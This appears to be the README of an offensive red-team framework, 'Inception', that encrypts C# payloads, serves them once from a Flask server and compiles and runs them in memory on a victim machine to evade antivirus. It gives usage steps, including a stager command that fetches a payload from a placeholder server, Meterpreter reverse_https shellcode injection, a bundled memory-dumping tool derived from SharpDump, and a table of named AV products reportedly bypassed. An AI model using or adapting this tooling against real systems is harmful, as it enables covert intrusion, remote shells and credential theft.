# Inception Framework

Inception provides In-memory compilation and reflective loading of C# apps for AV evasion. Payloads are AES encrypted before transmission and are decrypted in memory. The payload server ensures that payloads can only be fetched a pre-determined number of times. Once decrypted, Roslyn is used to build the C# payload in memory, which is then executed using reflection.

Inception has been successful in bypassing a number of AV products. These tests were conducted on a fully patched, 64-bit Windows 10 host using Metasploit Meterpreter shellcode.

| Product        | Bypass Type           |
| ------------- |:-------------:|
| Cylance     | 32-bit shellcode injection | 
| McAfee Endpoint  Adaptive Threat Protection      | 64-bit shellcode injection | 
| Sophos Intercept X     | 64-bit shellcode injection | 
| Symantec Endpoint 14      | 64-bit shellcode injection | 
| ESET Internet Security     | 64-bit shellcode injection | 


[@two06](https://twitter.com/two06) is the primary author of this project.

Inception is released under the MIT license. A derivative of the [SharpDump](https://github.com/GhostPack/SharpDump/)  project  is included with Inception, its licence file can be found in the SharpDump.licence file.

## Requirements

Flask (pip install Flask)
Colorama (pip install Colorama)

## Overview

Inception is comprised of three main components:

- The payload builder (inception.py)
- A payload server (server.py)
- The "stager", a .NET executable which must be launched on the victim machine. 

Payloads are built using Inception.py. Currently, two types of payload are supported:

- Shellcode
- Custom

These payload types are described in more detail below. Inception.py will guide you through the payload creation process, depending on which menu options are selected. 

Payloads are served using a Flask app (server.py). This app either serves the encrypted, pre-generated payload, or issues a redirect to a specified URL. Payloads are, by default, use-once. If an attempt to retrieve a payload which has already been used is made, the server will issue a redirect. If a non-existent payload is requested, the server will issue a redirect. 

The stager is a .NET application which fetches, decodes, compiles and executes the payload. This application must be run on the victim machine. The stager is large (~10MB) when built. 

### Usage

Generate payloads using Inception.py

```
python Inception.py                                                                                                   
 _____ _   _ _____  ___________ _____ _____ _____ _   _ 
|_   _| \ | /  __ \|  ___| ___ \_   _|_   _|  _  | \ | |
  | | |  \| | /  \/| |__ | |_/ / | |   | | | | | |  \| |
  | | | . ` | |    |  __||  __/  | |   | | | | | | . ` |
 _| |_| |\  | \__/\| |___| |     | |  _| |_\ \_/ / |\  |
 \___/\_| \_/\____/\____/\_|     \_/  \___/ \___/\_| \_/

'You mean, a dream within a dream?'

[*] Initial setup complete!
Select payload type:
1. Shellcode
2. Custom
3. Help
0. Quit
 >>  1

```
when firt run, Inception will generate a directory structure in ~/.inception/ containing the payload database, raw payload directory and encrypted payload directory. 

To serve payloads, run Server.py as root (Server.py listens on port 80).

```
sudo python Server.py
 * Serving Flask app "Server" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
```
Build the "RoslynLoad" .NET project, using visual studio. For 64-bit targets, the compiler MUST target x64. "Any CPU" can be used for 32-bit. 

Copy the generated EXE file to the victim machine and execute. 

```
UpdateService.exe "http://payload.server.URL/<ENCRYPTION KEY>"
```
The encryption key is displayed once a payload is generated using Inception.py

Note that a Metasploit listener must be running to receive the connect-back shell.

### Shellcode Payloads
Shellcode payloads use msfvenom to generate x86 or x64 Meterpreter shellcode. In this version, only reverse_https payloads are supported. 

x86 payloads use x86/shijata_ga_nai encoding. 
x64 payloads use x64/xor encoding. 

Generated shellcode is injected into a specified template file. Two examples have been included with this release:

- /Templates/Shellcode/ShellCode_Inject.txt
- /Templates/shellcode/ShellCode_Inject_76.txt

Template files contain a tag, which indicates where the generated shellcode should be placed:

```
byte[] shellcode = new byte[] {
     <SHELLCODE>
};

```

### Custom Payloads

Custom payloads allow arbitrary C# programs to be encrypted and loaded on the victim machine. No payload generation occurs for these templates; they must be complete C# programs. 

A modified version of [SharpDump](https://github.com/GhostPack/SharpDump) has been included with this release. 


### Creating Payloads

New payloads can be created using the following template. For Shellcode payloads, the SHELLCODE tag may be used to indicate where to place the generated shellcode.

```
Using System;
Using <other libraries>

namespace Inception
{
	class Program
	{
		//other methods as required
		
		public static void Run()
		{
			//Entrypoint code here
		}
	}
}
```
If non-standard libraries are required, the appropriate reference must be added to the Roslyn compilation code. The following examples shows the "System.IO.Compression.GZStream" reference (used by SharpDump).

```
MetadataReference[] references = new MetadataReference[]
            {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Enumerable).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.IO.Compression.GZipStream).Assembly.Location)
            };
```

## Acknowledgments

Lots of this code was modified from StackOverflow and various blog posts. If you see code that you wrote, which is not credited, please let me know and I'll be happy to add acknowledgements. 

